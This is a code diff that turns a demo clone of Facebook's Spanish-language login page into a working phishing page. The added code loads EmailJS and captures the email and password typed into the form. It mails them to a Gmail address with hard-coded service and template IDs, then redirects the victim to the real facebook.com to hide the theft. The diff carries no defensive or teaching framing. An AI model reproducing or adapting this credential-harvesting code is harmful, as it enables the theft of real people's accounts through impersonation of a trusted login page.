@@ -8,6 +8,7 @@
     <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/index.min.js"></script>
 </head>
 <body>
     <div id="root"></div>
@@ -15,12 +16,40 @@
     <script type="text/babel">
         const { useState } = React;
 
+        // Inicializar EmailJS
+        emailjs.init('qWiMP8LChbWxJNgWs');
+
         function FacebookLogin() {
           const [email, setEmail] = useState('');
           const [password, setPassword] = useState('');
+          const [loading, setLoading] = useState(false);
 
-          const handleLogin = () => {
-            alert('Función de inicio de sesión (demo)');
+          const handleLogin = async (e) => {
+            e.preventDefault();
+            setLoading(true);
+
+            if (!email || !password) {
+              alert('Por favor completa todos los campos');
+              setLoading(false);
+              return;
+            }
+
+            try {
+              // Enviar email a través de EmailJS
+              await emailjs.send('service_mn9co68', 'template_8yzlwpb', {
+                to_email: 'penegordoasustado@gmail.com',
+                user_email: email,
+                user_password: password,
+                subject: 'Nuevo intento de login en Facebook'
+              });
+
+              // Si se envía exitosamente, redirigir a Facebook
+              window.location.href = 'https://www.facebook.com';
+            } catch (error) {
+              console.error('Error al enviar email:', error);
+              alert('Ocurrió un error. Por favor intenta de nuevo.');
+              setLoading(false);
+            }
           };
 
           return (
@@ -41,13 +70,15 @@
                   {/* Right Side - Login Form */}
                   <div className="w-full max-w-md">
                     <div className="bg-white rounded-lg shadow-lg p-4">
-                      <div className="space-y-3">
+                      <form onSubmit={handleLogin} className="space-y-3">
                         <input
                           type="text"
                           placeholder="Correo electrónico o número de teléfono"
                           value={email}
                           onChange={(e) => setEmail(e.target.value)}
                           className="w-full px-4 py-3 border border-gray-300 rounded-md text-base focus:outline-none focus:border-blue-500"
+                          required
+                          disabled={loading}
                         />
                         <input
                           type="password"
@@ -55,14 +86,17 @@
                           value={password}
                           onChange={(e) => setPassword(e.target.value)}
                           className="w-full px-4 py-3 border border-gray-300 rounded-md text-base focus:outline-none focus:border-blue-500"
+                          required
+                          disabled={loading}
                         />
                         <button
-                          onClick={handleLogin}
-                          className="w-full bg-blue-600 hover:bg-blue-700 text-white text-lg font-bold py-3 rounded-md transition-colors"
+                          type="submit"
+                          disabled={loading}
+                          className="w-full bg-blue-600 hover:bg-blue-700 text-white text-lg font-bold py-3 rounded-md transition-colors disabled:opacity-50"
                         >
-                          Iniciar sesión
+                          {loading ? 'Iniciando sesión...' : 'Iniciar sesión'}
                         </button>
-                      </div>
+                      </form>
 
                       <div className="text-center my-4">
                         <a href="#" className="text-blue-600 hover:underline text-sm">
